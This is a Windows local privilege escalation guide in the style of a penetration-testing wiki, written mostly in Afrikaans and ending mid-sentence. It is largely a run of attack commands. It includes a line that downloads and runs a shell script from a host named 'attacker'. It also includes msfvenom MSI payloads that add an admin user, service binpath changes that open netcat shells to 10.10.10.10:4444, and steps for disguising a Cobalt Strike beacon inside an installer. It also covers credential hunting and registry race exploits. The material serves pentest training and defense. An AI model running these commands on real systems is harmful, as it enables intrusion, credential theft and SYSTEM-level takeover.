# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**As jy nie weet wat Windows Access Tokens is nie, lees asseblief die volgende bladsy voordat jy voortgaan:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Kyk na die volgende bladsy vir meer inligting oor ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**As jy nie weet wat integrity levels in Windows is nie, moet jy die volgende bladsy lees voordat jy voortgaan:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Daar is verskeie aspekte in Windows wat jou kan **verhoed om die stelsel te enumereer**, uitvoerbare lêers te laat loop of selfs jou **aktiwiteite te bespeur**. Jy moet die volgende **bladsy** lees en al hierdie **verdedigingsmeganismes** **enumereer** voordat jy met die privilege escalation enumeration begin:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess-processes wat deur `RAiLaunchAdminProcess` gelanseer word, kan misbruik word om High IL te bereik sonder prompts wanneer AppInfo secure-path checks omseil word. Kyk na die toegewyde UIAccess/Admin Protection bypass workflow hier:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation kan misbruik word vir 'n arbitrêre SYSTEM-registryskrywing (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## Stelsel Info

### Version info enumeration

Kontroleer of die Windows-weergawe enige bekende kwetsbaarheid het (kontroleer ook watter pleisters toegepas is).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Weergawe Exploits

Hierdie [site](https://msrc.microsoft.com/update-guide/vulnerability) is handig om gedetailleerde inligting oor Microsoft-sekuriteitskwesbaarhede te soek. Hierdie databasis bevat meer as 4,700 sekuriteitskwesbaarhede, wat die **massiewe aanvalsoppervlak** toon wat 'n Windows-omgewing bied.

**Op die stelsel**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Plaaslik met stelsel-inligting**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub-repos van exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Omgewing

Enige credentials/Juicy-inligting gestoor in die env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geskiedenis
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transkripsie-lêers

Jy kan leer hoe om dit aan te skakel by [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Besonderhede van PowerShell-pyplynuitvoerings word opgeteken, insluitend uitgevoerde opdragte, opdragaanroepe, en dele van skripte. Dit is egter moontlik dat volledige uitvoeringsbesonderhede en uitvoerresultate nie vasgelê word nie.

Om dit te aktiveer, volg die instruksies in die "Transcript files" afdeling van die dokumentasie, en kies **"Module Logging"** in plaas van **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Om die laaste 15 gebeurtenisse vanaf die PowersShell logs te sien, kan jy die volgende uitvoer:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

'n Volledige aktiwiteits- en inhoudsregister van die script se uitvoering word vasgelê, wat verseker dat elke block of code gedokumenteer word terwyl dit uitgevoer word. Hierdie proses bewaar 'n omvattende ouditspoor van elke aktiwiteit, waardevol vir forensics en vir die ontleding van kwaadwillige gedrag. Deur alle aktiwiteit tydens uitvoering te dokumenteer, word gedetailleerde insigte in die proses verskaf.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Loggebeure vir die Script Block kan gevind word in die Windows Gebeurteniskyker by die pad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Om die laaste 20 gebeure te sien, kan jy gebruik:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internetinstellings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Stasies
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Jy kan die stelsel kompromitteer as die opdaterings nie via http**S** versoek word nie, maar via http.

Jy begin deur te kontroleer of die netwerk 'n nie-SSL WSUS-opdatering gebruik deur die volgende in cmd uit te voer:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Of die volgende in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
As jy 'n antwoord kry soos een van die volgende:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
En as `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` of `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gelyk is aan `1`.

Dan is dit **uitbuitbaar.** As die laaste registerwaarde gelyk is aan `0`, sal die WSUS-invoer geïgnoreer word.

Om hierdie kwesbaarhede uit te buit kan jy gereedskap soos gebruik: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Dit is MiTM-geweaponiseerde uitbuitingsskripte om 'fake' updates in nie-SSL WSUS-verkeer in te spuit.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basies, dit is die fout wat hierdie bug uitbuit:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

Jy kan hierdie kwesbaarheid uitbuit met die hulpmiddel [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (sodra dit vrygestel is).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Baie enterprise-agente openbaar 'n localhost IPC-oppervlak en 'n geprivilegieerde update-kanaal. As enrollment na 'n aanvaller-seerwer gedwing kan word en die updater 'n rogue root CA of swak signer-checks vertrou, kan 'n plaaslike gebruiker 'n kwaadwillige MSI lewer wat die SYSTEM-diens installeer. Sien 'n gegeneraliseerde tegniek (gebaseer op die Netskope stAgentSvc-ketting – CVE-2025-0309) hier:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` openbaar 'n localhost-diens op **TCP/9401** wat aanvaller-gekontroleerde boodskappe verwerk, en willekeurige opdragte as **NT AUTHORITY\SYSTEM** toelaat.

- **Recon**: bevestig die luisteraar en weergawe, bv., `netstat -ano | findstr 9401` en `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: plaas 'n PoC soos `VeeamHax.exe` met die vereiste Veeam DLLs in dieselfde katalogus, en trigger dan 'n SYSTEM-payload oor die plaaslike socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Die diens voer die opdrag uit as SYSTEM.

## KrbRelayUp

Daar bestaan 'n **local privilege escalation** kwesbaarheid in Windows **domain**-omgewings onder spesifieke toestande. Hierdie toestande sluit in omgewings waar **LDAP signing is not enforced,** gebruikers self-regte het wat hulle toelaat om **Resource-Based Constrained Delegation (RBCD)** te konfigureer, en waar gebruikers die vermoë het om rekenaars binne die domain te skep. Dit is belangrik om te noem dat hierdie **vereistes** vervul word met **standaardinstellings**.

Vind die **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Vir meer inligting oor die verloop van die aanval, sien [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**As** hierdie 2 registers **geaktiveer** is (waarde is **0x1**), kan gebruikers met enige voorreg `*.msi`-lêers as NT AUTHORITY\\**SYSTEM** **installeer** (uitvoer).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
As jy 'n meterpreter-sessie het, kan jy hierdie tegniek outomatiseer met die module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Gebruik die `Write-UserAddMSI` opdrag van power-up om binne die huidige gids 'n Windows MSI binary te skep om privileges te eskaleer. Hierdie skrip skryf 'n precompiled MSI installer uit wat vir 'n user/group addition vra (dus sal jy GIU access nodig hê):
```
Write-UserAddMSI
```
Voer net die geskepte binaire uit om privilegies te eskaleer.

### MSI Wrapper

Lees hierdie handleiding om te leer hoe om 'n MSI wrapper te skep met hierdie gereedskap. Let daarop dat jy 'n "**.bat**" lêer kan omsluit as jy **net** wil **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Maak **Visual Studio** oop, kies **Create a new project** en tik "installer" in die soekboks. Kies die **Setup Wizard** projek en kliek **Next**.
- Gee die projek 'n naam, soos **AlwaysPrivesc**, gebruik **`C:\privesc`** vir die ligging, kies **place solution and project in the same directory**, en kliek **Create**.
- Hou aan om **Next** te klik totdat jy by stap 3 van 4 uitkom (kies lêers om in te sluit). Klik **Add** en kies die Beacon payload wat jy pas gegenereer het. Klik dan **Finish**.
- Merk die **AlwaysPrivesc** projek in die **Solution Explorer** en in die **Properties**, verander **TargetPlatform** van **x86** na **x64**.
- Daar is ander eienskappe wat jy kan verander, soos die **Author** en **Manufacturer**, wat die geïnstalleerde app meer legitiem kan laat lyk.
- Regsklik die projek en kies **View > Custom Actions**.
- Regsklik **Install** en kies **Add Custom Action**.
- Dubbelklik op **Application Folder**, kies jou **beacon.exe** lêer en klik **OK**. Dit sal verseker dat die beacon payload uitgevoer word sodra die installer uitgevoer word.
- Onder die **Custom Action Properties**, stel **Run64Bit** op **True**.
- Laastens, **build** dit.
- Indien die waarskuwing `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` vertoon word, maak seker jy stel die platform op x64.

### MSI Installation

Om die **installation** van die kwaadwillige `.msi` lêer in die **background** uit te voer:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Om hierdie kwesbaarheid uit te buit kan jy gebruik: _exploit/windows/local/always_install_elevated_

## Antivirus en Detektors

### Ouditinstellings

Hierdie instellings bepaal wat **opgeteken** word, dus moet jy aandag daaraan skenk
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, dit is interessant om te weet waarheen die logs gestuur word
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** is ontwerp vir die bestuur van plaaslike Administrator-wagwoorde, en verseker dat elke wagwoord uniek, ewekansig en gereeld opgedateer word op rekenaars wat by 'n domein aangesluit is. Hierdie wagwoorde word veilig in Active Directory gestoor en kan slegs deur gebruikers geraadpleeg word aan wie voldoende toestemmings deur ACLs toegekend is, sodat hulle plaaslike admin-wagwoorde kan sien indien gemagtig.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Indien aktief, word **onversleutelde wagwoorde in LSASS gestoor** (Local Security Authority Subsystem Service).\
[**Meer inligting oor WDigest op hierdie bladsy**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Vanaf **Windows 8.1** het Microsoft verbeterde beskerming vir die Local Security Authority (LSA) ingestel om pogings deur onbetroubare prosesse om **sy geheue te lees** of kode in te spuit te **blokkeer**, en sodoende die stelsel verder te beveilig.\ 
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** is geïntroduceer in **Windows 10**. Die doel daarvan is om die aanmeldbewyse wat op 'n toestel gestoor word, te beskerm teen bedreigings soos pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** word deur die **Local Security Authority** (LSA) geauthentiseer en deur bedryfstelselkomponente gebruik. Wanneer 'n gebruiker se aanmelddata deur 'n geregistreerde security package geauthentiseer word, word domain credentials vir die gebruiker gewoonlik geskep.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Gebruikers & Groepe

### Lys Gebruikers & Groepe

Jy moet nagaan of enige van die groepe waarvan jy deel uitmaak interessante toegangsregte het
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Bevoorregte groepe

As jy **lid is van 'n bevoorregte groep, kan jy moontlik bevoegdhede eskaleer**. Lees hier oor bevoorregte groepe en hoe om hulle te misbruik om bevoegdhede te eskaleer:

{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-manipulasie

**Lees meer** oor wat 'n **token** is op hierdie bladsy: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Kyk na die volgende bladsy om **te leer oor interessante tokens** en hoe om hulle te misbruik:

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Aangemelde gebruikers / Sessies
```bash
qwinsta
klist sessions
```
### Tuismappe
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Wagwoordbeleid
```bash
net accounts
```
### Haal die inhoud van die knipbord
```bash
powershell -command "Get-Clipboard"
```
## Lopende Prosesse

### Lêer- en vouerpermissies

Eerstens, deur prosesse te lys, **kontroleer vir wagwoorde in die opdragreël van die proses**.\
Kyk of jy 'n lopende binary kan **overskryf** of skryfpermissies op die binary-vouer het om moontlike [**DLL Hijacking attacks**](dll-hijacking/index.html) te misbruik:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Kontroleer altyd vir moontlike [**electron/cef/chromium debuggers** wat loop, jy kan dit misbruik om jou bevoegdhede te verhoog](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kontroleer die toestemmings van die prosesse se binaries**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kontroleer permissies van die vouers van die proses se binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Jy kan 'n memory dump van 'n lopende proses skep met **procdump** van sysinternals. Dienste soos FTP het die **credentials in clear text in memory**; probeer om die memory te dump en die credentials te lees.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Onveilige GUI-toepassings

**Toepassings wat as SYSTEM loop, kan 'n gebruiker toelaat om 'n CMD te open, of deur gidse te blaai.**

Voorbeeld: "Windows Help and Support" (Windows + F1), soek na "command prompt", klik op "Click to open Command Prompt"

## Dienste

Service Triggers laat Windows 'n diens begin wanneer sekere voorwaardes voorkom (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Selfs sonder SERVICE_START-regte kan jy dikwels bevoorregte dienste begin deur hul triggers te aktiveer. Sien enumeration and activation techniques hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

Kry 'n lys van dienste:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permissies

Jy kan **sc** gebruik om inligting oor 'n diens te kry
```bash
sc qc <service_name>
```
Dit word aanbeveel om die binaire **accesschk** van _Sysinternals_ te hê om die vereiste privilegievlak vir elke diens te kontroleer.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Dit word aanbeveel om te kontroleer of "Authenticated Users" enige diens kan wysig:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Jy kan accesschk.exe vir XP hier aflaai](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Skakel diens in

As jy hierdie fout kry (byvoorbeeld met SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Jy kan dit inskakel deur
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Neem in ag dat die diens upnphost van SSDPSRV afhang om te werk (vir XP SP1)**

**Nog 'n ompad vir hierdie probleem is om die volgende uit te voer:**
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

In die scenario waar die "Authenticated users" groep **SERVICE_ALL_ACCESS** op 'n diens het, is wysiging van die diens se uitvoerbare binêr moontlik. Om **sc** te wysig en uit te voer:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Herbegin diens
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegies kan via verskeie permissies opgeskaal word:

- **SERVICE_CHANGE_CONFIG**: Laat die herkonfigurasie van die service-binary toe.
- **WRITE_DAC**: Stel herkonfigurasie van permissies in staat, wat daartoe kan lei dat service-konfigurasies verander kan word.
- **WRITE_OWNER**: Laat die verkryging van eienaarskap en die herkonfigurasie van permissies toe.
- **GENERIC_WRITE**: Gee die vermoë om service-konfigurasies te verander.
- **GENERIC_ALL**: Gee ook die vermoë om service-konfigurasies te verander.

Vir die opsporing en uitbuiting van hierdie kwetsbaarheid kan die _exploit/windows/local/service_permissions_ gebruik word.

### Swak permissies op service-binaries

**Kyk of jy die binary wat deur 'n service uitgevoer word kan wysig** of as jy **skryfpermissies op die vouer** het waar die binary geleë is ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Jy kan elke binary wat deur 'n service uitgevoer word kry met **wmic** (nie in system32 nie) en jou permissies nagaan met **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Jy kan ook **sc** en **icacls** gebruik:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Dienste-register: wysig toestemmings

Kontroleer of jy enige diensteregister kan wysig.\
Jy kan jou **toestemmings** oor 'n diens **register** **kontroleer** deur:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Daar moet nagegaan word of **Authenticated Users** of **NT AUTHORITY\INTERACTIVE** die `FullControl` toestemmings het. As dit só is, kan die binêre wat deur die diens uitgevoer word, verander word.

Om die pad van die uitgevoerde binêre te verander:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Sommige Windows Accessibility-funksies skep per-gebruiker **ATConfig**-sleutels wat later deur 'n **SYSTEM**-proses na 'n HKLM-sessie-sleutel gekopieer word. 'n registry **symbolic link race** kan daardie bevoorregte skryf herlei na **any HKLM path**, wat 'n arbitêre HKLM **value write**-primitive verskaf.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lists installed accessibility features.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stores user-controlled configuration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` is created during logon/secure-desktop transitions and is writable by the user.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Populate the **HKCU ATConfig** value you want to be written by SYSTEM.
2. Trigger the secure-desktop copy (e.g., **LockWorkstation**), which starts the AT broker flow.
3. **Win the race** deur 'n **oplock** te plaas op `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; wanneer die oplock afgaan, vervang die **HKLM Session ATConfig** sleutel met 'n **registry link** na 'n beskermde HKLM-doel.
4. SYSTEM skryf die deur die aanvaller gekose waarde na die herlei­de HKLM-pad.

Sodra jy arbitêre HKLM value write het, kan jy na LPE draai deur dienskonfigurasiewaardes oor te skryf:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Kies 'n diens wat 'n normale gebruiker kan start (bv. **`msiserver`**) en trigger dit na die skryf. **Note:** die publieke exploit-implementering **locks the workstation** as deel van die race.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Dienste-register AppendData/AddSubdirectory toestemmings

As jy hierdie toestemming oor 'n register het, beteken dit dat **jy subregisters vanaf hierdie een kan skep**. In die geval van Windows services is dit **genoeg om arbitrêre kode uit te voer:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Ongeciteerde dienspade

As die pad na 'n uitvoerbare lêer nie binne aanhalingstekens is nie, sal Windows probeer om elke einde voor 'n spasie uit te voer.

Byvoorbeeld, vir die pad _C:\Program Files\Some Folder\Service.exe_ sal Windows probeer om die volgende uit te voer:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Lys alle dienspade sonder aanhalingstekens, uitgesluit dié van ingeboude Windows-dienste:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Jy kan hierdie kwesbaarheid opspoor en uitbuit** met metasploit: `exploit/windows/local/trusted\_service\_path` Jy kan handmatig 'n service binary skep met metasploit:
